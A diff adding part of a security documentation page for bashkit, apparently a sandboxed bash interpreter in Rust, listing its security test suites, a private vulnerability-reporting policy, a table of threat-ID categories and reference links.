+- **Builtin Error Security**: `tests/builtin_error_security_tests.rs` - 39 tests
+- **Logging Security**: `tests/logging_security_tests.rs` - 26 tests
+- **Git Security**: `tests/git_security_tests.rs` + `tests/git_remote_security_tests.rs`
+- **Audit PoC Tests**: `tests/security_audit_pocs.rs` - 2026-03 deep audit findings
+- **Fuzz Testing**: [`fuzz/`][fuzz] - Parser and lexer fuzzing
+
+## Reporting Security Issues
+
+If you discover a security vulnerability, please report it privately via
+GitHub Security Advisories rather than opening a public issue.
+
+## Threat ID Reference
+
+All threats use stable IDs in the format `TM-<CATEGORY>-<NUMBER>`:
+
+| Prefix | Category |
+|--------|----------|
+| TM-DOS | Denial of Service |
+| TM-ESC | Sandbox Escape |
+| TM-INF | Information Disclosure |
+| TM-INJ | Injection |
+| TM-NET | Network Security |
+| TM-AVAIL | Availability (fail-open auth) |
+| TM-ISO | Multi-Tenant Isolation |
+| TM-INT | Internal Error Handling |
+| TM-LOG | Logging Security |
+| TM-GIT | Git Security |
+| TM-SSH | SSH Security |
+| TM-PY | Python/Monty Security |
+| TM-SQL | SQLite Security |
+| TM-TS | TypeScript/ZapCode Security |
+| TM-CRY | Cryptography / Request Signing |
+| TM-SNAP | Snapshot Integrity |
+| TM-FS | RealFs Mount Security |
+| TM-UNI | Unicode Security |
+
+Full threat analysis: [`knowledge/security/threat-model.md`][spec]
+
+[limits]: https://docs.rs/bashkit/latest/bashkit/struct.ExecutionLimits.html
+[fslimits]: https://docs.rs/bashkit/latest/bashkit/struct.FsLimits.html
+[memory]: https://docs.rs/bashkit/latest/bashkit/struct.InMemoryFs.html
+[system]: https://docs.rs/bashkit/latest/bashkit/struct.BashBuilder.html#method.username
+[allowlist]: https://docs.rs/bashkit/latest/bashkit/struct.NetworkAllowlist.html
+[client]: https://docs.rs/bashkit/latest/bashkit/struct.HttpClient.html
+[threat_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/threat_model_tests.rs
+[failpoint_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/security_failpoint_tests.rs
+[network_tests]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/tests/network_security_tests.rs
+[fuzz]: https://github.com/everruns/bashkit/tree/main/crates/bashkit/fuzz
+[spec]: https://github.com/everruns/bashkit/blob/main/knowledge/security/threat-model.md
+[parser]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/parser/mod.rs
+[interp]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/interpreter/mod.rs
+[date]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/builtins/date.rs
+[diff]: https://github.com/everruns/bashkit/blob/main/crates/bashkit/src/builtins/diff.rs
